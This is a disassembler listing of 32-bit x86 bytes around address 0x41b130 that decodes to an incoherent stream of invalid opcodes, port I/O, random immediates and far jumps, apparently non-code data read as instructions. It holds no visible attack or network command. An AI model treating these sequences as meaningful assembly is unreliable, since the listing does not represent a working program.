  41b130:	add    al,0xd8
  41b132:	jg     0x41b13a
  41b134:	fs add edx,esp
  41b137:	jl     0x41b0d2
  41b139:	add    al,0x23
  41b13b:	mov    bh,0xd1
  41b13d:	pop    es
  41b13e:	aad    0x49
  41b140:	push   esi
  41b141:	pop    ds
  41b142:	mov    al,0x5
  41b144:	pop    edx
  41b145:	repz dec esi
  41b147:	xor    ch,BYTE PTR [edi]
  41b149:	je     0x41b1af
  41b14b:	and    al,0x9c
  41b14d:	je     0x41b158
  41b14f:	stos   DWORD PTR es:[edi],eax
  41b150:	push   cs
  41b151:	outs   dx,DWORD PTR ds:[esi]
  41b152:	ja     0x41b16b
  41b154:	dec    eax
  41b155:	jecxz  0x41b177
  41b157:	pop    es
  41b158:	mov    ch,0x4d
  41b15a:	imul   edx,DWORD PTR [esi+eiz*1+0x57923d4b],0xffffffeb
  41b162:	inc    esp
  41b163:	dec    esi
  41b164:	enter  0xe7fd,0xb6
  41b168:	rcl    al,0x4a
  41b16b:	scas   eax,DWORD PTR es:[edi]
  41b16c:	and    BYTE PTR [edi],dl
  41b16e:	pop    esi
  41b16f:	xchg   ecx,eax
  41b170:	inc    ecx
  41b171:	sbb    edx,ebp
  41b173:	loope  0x41b19b
  41b175:	push   edx
  41b176:	ror    DWORD PTR [ecx+0x32520796],cl
  41b17c:	cmp    dl,BYTE PTR [esi]
  41b17e:	sub    eax,0x162fc3ab
  41b183:	fld    TBYTE PTR [ecx+0x47831123]
  41b189:	cmp    edi,ebx
  41b18b:	xor    al,0x3f
  41b18d:	sbb    al,BYTE PTR [edx+0x6ef30b39]
  41b193:	and    DWORD PTR [edx],esi
  41b195:	xor    BYTE PTR [ebp-0x4f],0x79
  41b199:	out    dx,eax
  41b19a:	repz and al,dh
  41b19d:	and    ebp,DWORD PTR [ebx+edi*2]
  41b1a0:	in     eax,0x3e
  41b1a2:	ficomp DWORD PTR [edi+0x11]
  41b1a5:	dec    ebx
  41b1a6:	mov    edx,0x8301a61d
  41b1ab:	and    DWORD PTR [ecx-0x404e2f8c],esi
  41b1b1:	imul   esi,DWORD PTR [ebx+ebp*2+0x7a],0x0
	...
  41b215:	add    BYTE PTR [esi+0x6be069a5],cl
  41b21b:	in     al,dx
  41b21c:	(bad)  
  41b21d:	out    dx,eax
  41b21e:	arpl   WORD PTR [edi-0x53],sp
  41b221:	aas    
  41b222:	jge    0x41b1ff
  41b224:	retf   
  41b225:	clc    
  41b226:	or     BYTE PTR [esi],bl
  41b228:	add    DWORD PTR [eax],eax
  41b22a:	pop    es
  41b22b:	add    DWORD PTR [eax],eax
  41b22d:	add    BYTE PTR [eax-0x1a2dea52],bh
  41b233:	pop    ebx
  41b234:	pop    edx
  41b235:	mov    ds:0x19b5ed1,eax
  41b23a:	ins    DWORD PTR es:[edi],dx
  41b23b:	dec    esp
  41b23c:	fnsave [ebx+0x6a1a9222]
  41b242:	pop    ds
  41b243:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b244:	test   eax,0x374d1f59
  41b249:	js     0x41b232
  41b24b:	xchg   DWORD PTR ds:0xa97f091e,edx
  41b251:	in     al,0x8c
  41b253:	jnp    0x41b258
  41b255:	and    cl,BYTE PTR [ecx-0x726ca11]
  41b25b:	and    ah,BYTE PTR [ebx]
  41b25d:	dec    edi
  41b25e:	(bad)  
  41b260:	pop    eax
  41b261:	fwait
  41b262:	cmp    edi,DWORD PTR [esi-0x6d8bbf8b]
  41b268:	cmp    esp,DWORD PTR [edx]
  41b26a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b26b:	jnp    0x41b28e
  41b26d:	popa   
  41b26e:	jle    0x41b2c0
  41b270:	or     DWORD PTR [edi-0x45ca7257],edx
  41b276:	sub    BYTE PTR [eax+0x15],ah
  41b279:	or     DWORD PTR [ebp+0x62],ecx
  41b27c:	loope  0x41b23c
  41b27e:	add    ah,0xce
  41b281:	pusha  
  41b282:	push   ebx
  41b283:	scas   al,BYTE PTR es:[edi]
  41b284:	push   edi
  41b285:	rcl    BYTE PTR [edx+0x69adf747],cl
  41b28b:	mov    al,ah
  41b28d:	setle  BYTE PTR [ebp+0x1f50aedd]
  41b294:	fnstenv [ebx]
  41b296:	dec    esp
  41b297:	dec    eax
  41b298:	jmp    0x5e36:0x26ee65b1
  41b29f:	jl     0x41b2bb
  41b2a1:	cmp    esi,0xea34f3f9
  41b2a7:	sbb    dl,BYTE PTR ds:0x8fe4849b
  41b2ad:	mov    cl,0x2e
  41b2af:	or     al,0xb0
  41b2b1:	shl    BYTE PTR [ecx],0xf8
  41b2b4:	jl     0x41b2c3
  41b2b6:	adc    ecx,DWORD PTR [edx+0x6d]
  41b2b9:	mov    esp,DWORD PTR gs:[esi+ecx*4-0x4f]
  41b2be:	xchg   edi,eax
  41b2bf:	(bad)  
  41b2c0:	xchg   esi,eax
  41b2c1:	mov    al,ds:0x48fa5fda
  41b2c6:	es cs inc ecx
  41b2c9:	inc    esi
  41b2ca:	jno    0x41b323
  41b2cc:	ja     0x41b2ae
  41b2ce:	push   ecx
  41b2cf:	aad    0x55
  41b2d1:	gs pop ds
  41b2d3:	rcr    DWORD PTR [ebp-0x3c],0x2c
  41b2d7:	cmc    
  41b2d8:	mov    eax,0x4ba12c85
  41b2dd:	sbb    eax,DWORD PTR ds:0x319c9326
  41b2e3:	lods   eax,DWORD PTR ds:[esi]
  41b2e4:	test   DWORD PTR [edx],ebx
  41b2e6:	xor    al,bh
  41b2e8:	fxch   st(5)
  41b2ea:	fsubr  QWORD PTR [edx]
  41b2ec:	cmc    
  41b2ed:	cmp    BYTE PTR [edi+0x2a],dh
  41b2f0:	das    
  41b2f1:	scas   eax,DWORD PTR es:[edi]
  41b2f2:	test   al,0x26
  41b2f4:	push   ebx
  41b2f5:	mov    ?,WORD PTR [edi-0x56]
  41b2f8:	scas   al,BYTE PTR es:[edi]
  41b2f9:	stos   DWORD PTR es:[edi],eax
  41b2fa:	mov    gs:0x82a897d1,eax
  41b300:	(bad)  
  41b301:	popa   
  41b302:	pop    edi
  41b303:	sbb    edi,DWORD PTR [ecx-0x48]
  41b306:	(bad)  
  41b307:	jmp    0x41b347
  41b309:	lahf   
  41b30a:	loopne 0x41b351
  41b30c:	and    ebp,DWORD PTR [esi]
  41b30e:	xor    BYTE PTR ds:0xfb8fa84d,0xb6
  41b315:	lds    edx,FWORD PTR [eax]
  41b317:	pop    ds
  41b318:	call   0x97a9d049
  41b31d:	jae    0x41b369
  41b31f:	jp     0x41b2bf
  41b321:	cmp    BYTE PTR [eax-0x40],0x25
  41b325:	jl     0x41b34f
  41b327:	repz xor bl,BYTE PTR [ebp-0x167a27ed]
  41b32e:	inc    eax
  41b32f:	mov    BYTE PTR [eax-0x3ba1f258],dh
	...
  41b395:	add    BYTE PTR [eax+0xd],cl
  41b398:	sbb    eax,0xfebb5dab
  41b39d:	out    dx,eax
  41b39e:	cld    
  41b39f:	(bad)  
  41b3a0:	mov    ?,eax
  41b3a2:	in     al,dx
  41b3a3:	sub    edi,edi
  41b3a5:	pop    edx
  41b3a6:	nop    DWORD PTR [ecx]
  41b3a9:	add    BYTE PTR [edi],al
  41b3ab:	add    DWORD PTR [eax],eax
  41b3ad:	add    BYTE PTR [eax-0x78],ah
  41b3b0:	fmul   QWORD PTR [ebx+eax*8+0x7531aed0]
  41b3b7:	repz adc eax,0xf65a195
  41b3bd:	mov    ds:0x5ef7a34c,eax
  41b3c2:	sbb    ebx,esp
  41b3c4:	outs   dx,BYTE PTR ds:[esi]
  41b3c5:	lods   eax,DWORD PTR ds:[esi]
  41b3c6:	jne    0x41b422
  41b3c8:	mov    cl,0xee
  41b3ca:	hlt    
  41b3cb:	jmp    0xf1ec345c
  41b3d0:	cwde   
  41b3d1:	leave  
  41b3d2:	cdq    
  41b3d3:	mov    ah,0xa0
  41b3d5:	xor    al,0xdd
  41b3d7:	dec    esi
  41b3d8:	addr16 sti 
  41b3da:	sub    BYTE PTR [esi-0x4d],bl
  41b3dd:	or     dh,BYTE PTR [eax-0x7c]
  41b3e0:	call   0x1b3cf05a
  41b3e5:	les    ebp,FWORD PTR [esi]
  41b3e7:	imul   esi,DWORD PTR [ebp+0x69],0xd3e5e687
  41b3ee:	sahf   
  41b3ef:	jnp    0x41b44d
  41b3f1:	data16 shr BYTE PTR [edi-0x190c713b],0x23
  41b3f9:	mov    bl,bl
  41b3fb:	(bad)  
  41b3fc:	aaa    
  41b3fd:	ss dec ebx
  41b3ff:	push   cs
  41b400:	in     eax,dx
  41b401:	scas   eax,DWORD PTR es:[edi]
  41b402:	inc    ebp
  41b403:	stos   DWORD PTR es:[edi],eax
  41b404:	pop    es
  41b405:	inc    eax
  41b406:	ins    BYTE PTR es:[edi],dx
  41b407:	and    eax,0xcd9be16f
  41b40c:	lock pop ds
  41b40e:	imul   ebp,DWORD PTR [edi],0xbb07df1e
  41b414:	ja     0x41b3cd
  41b416:	sub    eax,0xaef8c62c
  41b41b:	inc    edi
  41b41c:	adc    eax,DWORD PTR [ebp+0x1722cd44]
  41b422:	pop    DWORD PTR [esi+0x47d56da3]
  41b428:	xchg   edx,eax
  41b42a:	aaa    
  41b42b:	data16 loope 0x41b3e6
  41b42e:	outs   dx,DWORD PTR ds:[esi]
  41b42f:	neg    DWORD PTR [esi]
  41b431:	inc    edi
  41b432:	mov    esp,0x9311014e
  41b437:	or     ebx,DWORD PTR [eax-0x79fbe3cd]
  41b43d:	adc    edi,DWORD PTR [edx-0x4df2bad8]
  41b443:	cmp    bl,BYTE PTR [ecx-0x74]
  41b446:	into   
  41b447:	jmp    0xdbea435a
  41b44c:	stc    
  41b44d:	push   ebp
  41b44e:	cdq    
  41b44f:	lods   al,BYTE PTR ds:[esi]
  41b450:	dec    esi
  41b451:	lods   al,BYTE PTR ss:[esi]
  41b453:	ret    0x99d5
  41b456:	int    0x7b
  41b458:	cmp    BYTE PTR [edx+0x7f7f606b],0xb1
  41b45f:	rcl    ch,1
  41b461:	jo     0x41b4c2
  41b463:	jb     0x41b417
  41b465:	shr    dl,cl
  41b467:	out    0xf1,al
  41b469:	xor    DWORD PTR [ecx+0x5e],edi
  41b46c:	repz jne 0x41b430
  41b46f:	mov    ds:0x929f9cb6,al
  41b474:	mov    WORD PTR [eax+0x28d536d3],gs
  41b47a:	sbb    ah,BYTE PTR [ebx]
  41b47c:	inc    edx
  41b47d:	xchg   ecx,eax
  41b47e:	pop    es
  41b47f:	iret   
  41b480:	jnp    0x41b434
  41b482:	lods   al,BYTE PTR ds:[esi]
  41b483:	ret    
  41b484:	fst    DWORD PTR [ebp-0x49]
  41b487:	or     bh,cl
  41b489:	mov    eax,0x69812553
  41b48e:	cmp    ebp,DWORD PTR [ebx]
  41b490:	xchg   ecx,eax
  41b491:	fsubr  QWORD PTR [edi+eiz*2]
  41b494:	cs pop esi
  41b496:	sub    al,0x43
  41b498:	lds    edi,FWORD PTR [edx-0x7b2608b6]
  41b49e:	das    
  41b49f:	inc    ecx
  41b4a0:	push   cs
  41b4a1:	dec    ebp
  41b4a2:	(bad)  
  41b4a3:	aad    0x3a
  41b4a5:	fild   QWORD PTR [ecx+0x25]
  41b4a8:	mov    ecx,0x7a0b895a
  41b4ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4ae:	push   si
  41b4b0:	mov    bh,0x44
  41b4b2:	xor    BYTE PTR ds:0xae,al
	...
  41b514:	add    BYTE PTR [eax],al
  41b516:	aam    0xec
  41b518:	add    edi,edi
  41b51a:	cmp    edi,edi
  41b51c:	(bad)  
  41b51d:	out    dx,eax
  41b51e:	lock add DWORD PTR [ebp-0x3c],ebp
  41b522:	pop    ds
  41b523:	scas   eax,DWORD PTR es:[edi]
  41b524:	adc    DWORD PTR [edx+0x16],ebp
  41b527:	and    BYTE PTR [ecx],al
  41b529:	add    BYTE PTR [edi],al
  41b52b:	add    DWORD PTR [eax],eax
  41b52d:	add    BYTE PTR ds:0xf8a15e9b,ch
  41b533:	mov    bl,0x58
  41b535:	xchg   esi,eax
  41b536:	mov    esp,0x7bfc2e2c
  41b53b:	(bad)  
  41b53c:	mov    WORD PTR [esi+0x68dcbf05],fs
  41b542:	pushf  
  41b543:	or     BYTE PTR [ebp+0x14d6eb7a],dl
  41b549:	push   ebx
  41b54a:	and    DWORD PTR [esi-0x1d0ac8],ecx
  41b550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b551:	stos   BYTE PTR es:[edi],al
  41b552:	xor    al,0xad
  41b554:	lods   eax,DWORD PTR ds:[esi]
  41b555:	das    
  41b556:	inc    edi
  41b557:	retf   0x4afc
  41b55a:	adc    al,0x7e
  41b55c:	popa   
  41b55d:	fld    DWORD PTR [edi-0x26df0e4d]
  41b563:	cld    
  41b564:	dec    ecx
  41b565:	jb     0x41b56f
  41b567:	push   ss
  41b568:	(bad)  
  41b569:	icebp  
  41b56a:	sahf   
  41b56b:	lea    edx,[eax+0x3925a3c1]
  41b571:	cs mov bh,0x8f
  41b574:	cli    
  41b575:	xor    DWORD PTR [eax+0x38446a4b],ebp
  41b57b:	push   eax
  41b57c:	push   edx
  41b57d:	mov    bh,bh
  41b57f:	sar    DWORD PTR [esi],0xad
  41b582:	add    eax,0xc9d39e37
  41b587:	test   BYTE PTR [eax+eax*1-0x43],0x8c
  41b58c:	or     eax,DWORD PTR [ebp-0x3c]
  41b58f:	stos   DWORD PTR es:[edi],eax
  41b590:	test   BYTE PTR [bp+0x4f],cl
  41b594:	cmp    ebp,DWORD PTR [ebp-0x34]
  41b597:	push   ss
  41b598:	hlt    
  41b599:	dec    esp
  41b59a:	push   eax
  41b59b:	mov    ch,0x33
  41b59d:	add    DWORD PTR [ecx-0x64dce176],0x4b56ee75
  41b5a7:	xchg   esp,eax
  41b5a8:	sbb    ecx,DWORD PTR [edx-0x4f5a3306]
  41b5ae:	pop    eax
  41b5af:	xlat   BYTE PTR ds:[ebx]
  41b5b0:	bound  edx,QWORD PTR [eax+0x354c5efa]
  41b5b6:	pop    ds
  41b5b7:	fldenv [edi-0x57]
  41b5ba:	push   ecx
  41b5bb:	cmp    edi,ebp
  41b5bd:	daa    
  41b5be:	addr16 xchg esp,eax
  41b5c0:	sbb    eax,0x537ca32b
  41b5c5:	cmp    eax,0x3986020d
  41b5ca:	inc    esi
  41b5cb:	in     al,dx
  41b5cc:	or     al,0x2a
  41b5ce:	icebp  
  41b5cf:	dec    edi
  41b5d0:	sbb    eax,0xa6123667
  41b5d5:	shl    DWORD PTR [esp+ebp*1-0x61],0xeb
  41b5da:	repz repnz mov eax,ds:0x7c5482f7
  41b5e1:	xlat   BYTE PTR ds:[ebx]
  41b5e2:	ss call 0xbf0472ff
  41b5e8:	push   es
  41b5e9:	mov    ds:0x31a9c130,eax
  41b5ee:	and    al,0xfe
  41b5f0:	jae    0x41b59e
  41b5f2:	loope  0x41b5ff
  41b5f4:	inc    esp
  41b5f5:	and    BYTE PTR [esi-0x5df4f9da],dh
  41b5fb:	and    eax,0x448bd062
  41b600:	xor    al,0xb8
  41b602:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b603:	test   DWORD PTR [edi+eiz*2],edi
  41b606:	in     al,0x17
  41b608:	in     al,0x51
  41b60a:	mov    edx,0xabc315c2
  41b60f:	lds    ebx,FWORD PTR ds:0xe282b272
  41b615:	push   eax
  41b616:	mov    ds:0x4da5d553,al
  41b61b:	add    DWORD PTR [ebx-0x574d7573],esp
  41b621:	les    ebx,FWORD PTR [ebp-0x57]
  41b624:	dec    ecx
  41b625:	test   DWORD PTR [ebp+0x1384b1b0],edi
  41b62b:	or     al,0x40
  41b62d:	dec    esp
  41b62e:	stos   BYTE PTR es:[edi],al
  41b62f:	lods   eax,DWORD PTR ds:[esi]
  41b630:	jmp    FWORD PTR [ecx+0x33]
  41b633:	je     0x41b657
	...
  41b695:	add    BYTE PTR [eax-0x2469e49d],ch
  41b69b:	(bad)  
  41b69c:	lods   eax,DWORD PTR ds:[esi]
  41b69d:	jg     0x41b6db
  41b69f:	sub    al,dl
  41b6a1:	add    BYTE PTR [ebp-0x31],al
  41b6a4:	push   0xffffffe5
  41b6a6:	sbb    eax,0x7000121
  41b6ab:	add    DWORD PTR [eax],eax
  41b6ad:	add    dl,ah
  41b6af:	gs mov ch,0x57
  41b6b2:	sbb    DWORD PTR [edx-0x720439fc],edi
  41b6b8:	dec    edi
  41b6b9:	pop    eax
  41b6ba:	push   esi
  41b6bb:	shl    BYTE PTR [edi],cl
  41b6bd:	(bad)  
  41b6be:	call   DWORD PTR [edi-0x70]
  41b6c1:	je     0x41b72b
  41b6c3:	fld    QWORD PTR [ebp-0x29]
  41b6c6:	test   eax,0x9fe2feb3
  41b6cb:	lods   al,BYTE PTR ds:[esi]
  41b6cc:	std    
  41b6cd:	retf   0x3c96
  41b6d0:	fld    TBYTE PTR [edi]
  41b6d2:	fs loope 0x41b659
  41b6d5:	jnp    0x41b714
  41b6d7:	pop    edi
  41b6d8:	add    bh,0x1c
  41b6db:	dec    edx
  41b6dc:	ds adc bl,bh
  41b6df:	cwde   
  41b6e0:	push   edi
  41b6e1:	hlt    
  41b6e2:	std    
  41b6e3:	or     eax,0xe3e75562
  41b6e8:	mov    DWORD PTR [edi-0x1a],ebx
  41b6eb:	stc    
  41b6ec:	fbstp  TBYTE PTR [eax+edx*2+0x71]
  41b6f0:	out    dx,al
  41b6f1:	lahf   
  41b6f2:	adc    eax,0x238ffd8d
  41b6f7:	(bad)  
  41b6f8:	mov    cl,0xbf
  41b6fa:	inc    ebx
  41b6fb:	hlt    
  41b6fc:	xor    edi,DWORD PTR [edi-0x2f4ec3e5]
  41b702:	es push eax
  41b704:	cmc    
  41b705:	jae    0x41b6c3
  41b707:	fsub   QWORD PTR [edi-0x6d]
  41b70a:	xchg   ebx,eax
  41b70b:	xchg   ebx,eax
  41b70c:	(bad)  
  41b70d:	les    ecx,FWORD PTR [edi-0x4100b494]
  41b713:	aad    0x34
  41b715:	fs lock cwde 
  41b718:	in     eax,dx
  41b719:	jmp    0x3b24:0x6b8897bb
  41b720:	js     0x41b6bc
  41b722:	(bad)  
  41b723:	clc    
  41b724:	stos   DWORD PTR es:[edi],eax
  41b725:	dec    edi
  41b726:	dec    ebx
  41b727:	push   edx
  41b728:	ss ss lahf 
  41b72b:	ja     0x41b6e1
  41b72d:	fld1   
  41b72f:	into   
  41b730:	hlt    
  41b731:	ins    DWORD PTR es:[edi],dx
  41b732:	inc    ecx
  41b733:	push   ds
  41b734:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b735:	jnp    0x41b7a1
  41b737:	inc    esi
  41b738:	out    dx,al
  41b739:	ret    
  41b73a:	test   al,0x8b
  41b73c:	sbb    BYTE PTR ds:0xca82d436,al
  41b742:	(bad)  
  41b743:	arpl   WORD PTR [ebp+0x4d3cbdc4],si
  41b749:	aaa    
  41b74a:	cmp    eax,0x4b8dfa14
  41b74f:	int3   
  41b750:	xor    al,0x5b
  41b753:	(bad)  
  41b754:	in     al,0xf7
  41b756:	mov    ah,0x65
  41b758:	xor    DWORD PTR [edi],esi
  41b75a:	popf   
  41b75b:	cwde   
  41b75c:	sub    bh,BYTE PTR fs:[ecx-0x67367c1c]
  41b763:	shl    edx,cl
  41b765:	pop    ebp
  41b766:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b767:	hlt    
  41b768:	pop    esi
  41b769:	dec    ebx
  41b76a:	push   es
  41b76b:	pushf  
  41b76c:	mov    edx,0xe83ff7cc
  41b771:	int    0x19
  41b773:	lock (bad) 
  41b775:	fcom   QWORD PTR [ebp-0x3651888e]
  41b77b:	mov    dl,0xe9
  41b77d:	rcl    BYTE PTR [ebx-0x4ba143d2],cl
  41b783:	mov    al,0x6b
  41b785:	in     al,0x73
  41b787:	xchg   edx,eax
  41b788:	cmp    bh,bl
  41b78a:	(bad)
  41b78e:	ja     0x41b777
  41b790:	daa    
  41b791:	ins    BYTE PTR es:[edi],dx
  41b792:	popf   
  41b793:	xor    DWORD PTR [ecx+0x153c2a17],ebp
  41b799:	xor    dh,bl
  41b79b:	sar    dh,1
  41b79d:	cmp    eax,0x4e
  41b7a0:	outs   dx,DWORD PTR ds:[esi]
  41b7a1:	xchg   ebx,eax
  41b7a2:	pop    esi
  41b7a3:	pop    es
  41b7a4:	bound  eax,QWORD PTR [ebp-0x47]
  41b7a7:	xchg   ebp,eax
  41b7a8:	pop    esi
  41b7a9:	in     al,dx
  41b7aa:	sbb    al,0x82
  41b7ac:	dec    esp
  41b7ad:	jno    0x41b761
  41b7af:	pop    ecx
  41b7b0:	sbb    BYTE PTR [ebx],0x4b
  41b7b3:	jmp    0x41b817
	...
  41b815:	add    BYTE PTR [edx-0x8b13804],cl
  41b81b:	jg     0x41b7a8
  41b81d:	cld    
  41b81e:	fcmovbe st,st(0)
  41b820:	(bad)  
  41b821:	out    0x60,al
  41b823:	out    0xc7,al
  41b825:	pushf  
  41b826:	and    al,0x22
  41b828:	add    DWORD PTR [eax],eax
  41b82a:	pop    es
  41b82b:	add    DWORD PTR [eax],eax
  41b82d:	add    BYTE PTR [edi+0x658475c0],ch
  41b833:	dec    ebx
  41b834:	mov    edi,0xbfea6386
  41b839:	jo     0x41b854
  41b83b:	xchg   ecx,eax
  41b83c:	sahf   
  41b83d:	js     0x41b7f0
  41b83f:	add    BYTE PTR [ebx+0x3f],bl
  41b842:	repnz adc al,0x1d
  41b845:	cmp    bl,BYTE PTR [eax+0x47]
  41b848:	jae    0x41b84f
  41b84a:	jp     0x41b815
  41b84c:	push   0xd0861e4b
  41b851:	or     ch,BYTE PTR [eax]
  41b853:	inc    edx
  41b854:	or     bh,BYTE PTR [esi-0x711f3b59]
  41b85a:	and    cl,0x3e
  41b85d:	xchg   edx,eax
  41b85e:	adc    BYTE PTR [ecx+eax*4],al
  41b861:	and    DWORD PTR ds:0x8cf340ab,eax
  41b867:	fistp  DWORD PTR [esi]
  41b869:	je     0x41b7fc
  41b86b:	mov    bl,0x96
  41b86d:	jo     0x41b8ae
  41b86f:	mov    esi,0x5c2d623c
  41b874:	mov    ch,0x77
  41b876:	mov    edi,0x5e30ed0c
  41b87b:	fcom   st(6)
  41b87d:	shr    DWORD PTR [ebp-0x4d],0x22
  41b881:	dec    esi
  41b882:	fiadd  DWORD PTR [esi+eiz*1-0x24]
  41b886:	fwait
  41b887:	leave  
  41b888:	test   al,0x40
  41b88b:	lods   eax,DWORD PTR ds:[esi]
  41b88c:	iret   
  41b88d:	call   0x56111a07
  41b892:	aam    0x51
  41b894:	in     al,dx
  41b895:	inc    edx
  41b896:	cmp    ebx,DWORD PTR [ebp-0xfa26faa]
  41b89c:	int3   
  41b89d:	stos   BYTE PTR es:[edi],al
  41b89e:	mov    ebp,cs
  41b8a0:	xchg   edi,eax
  41b8a1:	shr    BYTE PTR [edx-0x62],0x92
  41b8a5:	cmp    BYTE PTR [edx+0x23b80a7d],cl
  41b8ab:	sbb    DWORD PTR [ebx+esi*1-0x4b],ecx
  41b8af:	fnstsw ax
  41b8b1:	lea    ebp,[eax]
  41b8b3:	mov    al,0x15
  41b8b5:	test   eax,0x6b94eda2
  41b8ba:	gs or  BYTE PTR es:0x94acf21e,al
  41b8c2:	gs jg  0x41b85f
  41b8c5:	mov    ecx,0x72b439f1
  41b8ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8cb:	dec    esi
  41b8cc:	or     DWORD PTR [esi-0x30c2177e],edx
  41b8d2:	out    0x66,eax
  41b8d4:	xchg   edi,eax
  41b8d5:	push   es
  41b8d6:	and    esp,edi
  41b8d8:	gs je  0x41b8e2
  41b8db:	fsub   DWORD PTR [edx-0x35]
  41b8de:	(bad)  
  41b8df:	pop    edi
  41b8e0:	dec    ebp
  41b8e1:	or     esi,ebp
  41b8e3:	mov    eax,0x9922258f
  41b8e8:	sahf   
  41b8e9:	dec    edi
  41b8ea:	cmp    edi,DWORD PTR ds:[esp+edi*1+0x8a60d0]
  41b8f2:	xchg   BYTE PTR [edi],ah
  41b8f4:	je     0x41b8ab
  41b8f6:	pop    ss
  41b8f7:	iret   
  41b8f8:	out    0x33,eax
  41b8fa:	stos   BYTE PTR es:[edi],al
  41b8fb:	cdq    
  41b8fc:	cs dec ecx
  41b8fe:	ret    
  41b8ff:	in     al,dx
  41b900:	inc    esi
  41b901:	sbb    al,0xda
  41b903:	mov    esp,0x26c3c795
  41b908:	pop    ds
  41b909:	jmp    0x9d46d84d
  41b90e:	push   ss
  41b90f:	mov    esp,0x32405f9d
  41b914:	mov    ecx,0x5674bc4c
  41b919:	pop    DWORD PTR [eax+edi*1]
  41b91c:	shl    DWORD PTR [edi-0x1f],0x3f
  41b920:	loop   0x41b8af
  41b922:	jle    0x41b8c1
  41b924:	push   0x7a
  41b926:	xor    BYTE PTR [edi],0xa2
  41b929:	dec    eax
  41b92a:	mov    ds:0x1b25051a,al
  41b92f:	dec    eax
  41b930:	fcomp  QWORD PTR [eax]
  41b932:	cmp    al,0x6d
  41b934:	enter  0x0,0x0
	...
  41b994:	add    BYTE PTR [eax],al
  41b996:	ret    
  41b997:	mov    esp,0xf87f4844
  41b99c:	iret   
  41b99d:	mov    edi,0x51d578ae
  41b9a2:	sbb    edx,edi
  41b9a4:	jae    0x41b9c5
  41b9a6:	sub    esp,DWORD PTR [ebx]
  41b9a8:	add    DWORD PTR [eax],eax
  41b9aa:	pop    es
  41b9ab:	add    DWORD PTR [eax],eax
  41b9ad:	add    BYTE PTR ds:0x11da966e,cl
  41b9b3:	push   es
  41b9b4:	shl    DWORD PTR [edx-0x14],cl
  41b9b7:	cmp    al,0xe7
  41b9b9:	cmc    
  41b9ba:	push   esi
  41b9bb:	add    al,ch
  41b9bd:	jmp    0xdf103a14
  41b9c2:	shl    edx,cl
  41b9c4:	push   edx
  41b9c5:	adc    ah,al
  41b9c7:	cmp    al,0x20
  41b9c9:	push   ss
  41b9ca:	push   ss
  41b9cb:	std    
  41b9cc:	adc    DWORD PTR [edx+0x4e74a338],ebp
  41b9d2:	gs ins DWORD PTR es:[edi],dx
  41b9d4:	je     0x41b99d
  41b9d6:	adc    al,0x7a
  41b9d8:	xchg   esi,eax
  41b9d9:	and    DWORD PTR [ecx+0x3a],ebx
  41b9dc:	add    BYTE PTR [eax-0x3fc1844f],bh
  41b9e2:	push   esi
  41b9e3:	add    DWORD PTR [edi+0x57],0x6f9d6ff7
  41b9ea:	and    BYTE PTR ds:0xafc59b8d,0x7d
  41b9f2:	pop    ss
  41b9f3:	adc    BYTE PTR [esi-0xc22fca4],ah
  41b9f9:	mov    ah,ah
  41b9fb:	je     0x41ba5b
  41b9fd:	mov    eax,0xc9f16942
  41ba02:	sahf   
  41ba03:	mov    WORD PTR [ebp+0x51],ss
  41ba06:	xor    DWORD PTR [edx-0x143e145f],0x1a
  41ba0d:	pop    ebx
  41ba0e:	aad    0xe4
  41ba10:	fcom   QWORD PTR ds:0x88b95d06
  41ba16:	cdq    
  41ba17:	mov    eax,0x60b26f4b
  41ba1c:	fimul  DWORD PTR [ecx+0x4a]
  41ba1f:	sbb    eax,DWORD PTR [ecx]
  41ba21:	cli    
  41ba22:	mov    bl,0x6b
  41ba24:	stos   DWORD PTR es:[edi],eax
  41ba25:	jb     0x41b9b8
  41ba27:	stos   BYTE PTR es:[edi],al
  41ba28:	int    0xcc
  41ba2a:	shl    BYTE PTR [edi+eiz*2],cl
  41ba2d:	test   DWORD PTR [ebp+edx*4-0x43],ebx
  41ba31:	aas    
  41ba32:	cmp    eax,0xca083a84
  41ba37:	cwde   
  41ba38:	lea    eax,[esi+0x6f]
  41ba3b:	mov    WORD PTR [ecx-0x6b9fe9ba],?
  41ba41:	stc    
  41ba42:	add    bh,BYTE PTR [ecx+0x41]
  41ba45:	pop    edx
  41ba46:	(bad)  
  41ba47:	fidiv  DWORD PTR [eax]
  41ba49:	ss sti 
  41ba4b:	mov    cl,0x57
  41ba4d:	pop    eax
  41ba4e:	(bad)  
  41ba4f:	push   ds
  41ba50:	pop    esi
  41ba51:	sti    
  41ba52:	popa   
  41ba53:	cmp    ah,BYTE PTR [esp+esi*4]
  41ba56:	and    DWORD PTR [edi],0xffffff94
  41ba59:	jecxz  0x41ba68
  41ba5b:	icebp  
  41ba5c:	mov    ecx,0x15c797d8
  41ba61:	mov    esi,0x4167491e
  41ba66:	xor    al,0xce
  41ba68:	and    al,BYTE PTR [ecx-0x4cca24fa]
  41ba6e:	adc    BYTE PTR [esi-0x52],0x97
  41ba72:	pop    ecx
  41ba73:	and    cl,BYTE PTR [edi]
  41ba75:	inc    esp
  41ba76:	out    0x31,eax
  41ba78:	sbb    ecx,DWORD PTR [ecx-0x37]
  41ba7b:	mov    edx,0x27edbe7c
  41ba80:	stc    
  41ba81:	lea    eax,[edx]
  41ba83:	repz (bad) 
  41ba85:	cmp    al,0xf7
  41ba87:	lahf   
  41ba88:	dec    eax
  41ba89:	and    BYTE PTR [ebx-0x531c9cde],dh
  41ba8f:	hlt    
  41ba90:	mov    ecx,0x897d5929
  41ba95:	sub    DWORD PTR [ebx],ecx
  41ba97:	push   eax
  41ba98:	inc    esp
  41ba99:	in     al,0x86
  41ba9b:	mov    edi,0x67224713
  41baa0:	xor    BYTE PTR ds:0x657b2c20,al
  41baa6:	or     eax,0x85ee8d83
  41baab:	jp     0x41bacd
  41baad:	cmp    BYTE PTR [eax+0x44e18049],dh
  41bab3:	les    eax,FWORD PTR ds:0x0
	...
  41bb15:	add    BYTE PTR [edx],cl
  41bb17:	mov    eax,0xbfb7aaa5
  41bb1c:	(bad)  
  41bb1e:	lahf   
  41bb1f:	and    esp,DWORD PTR [ebx-0x56]
  41bb22:	popa   
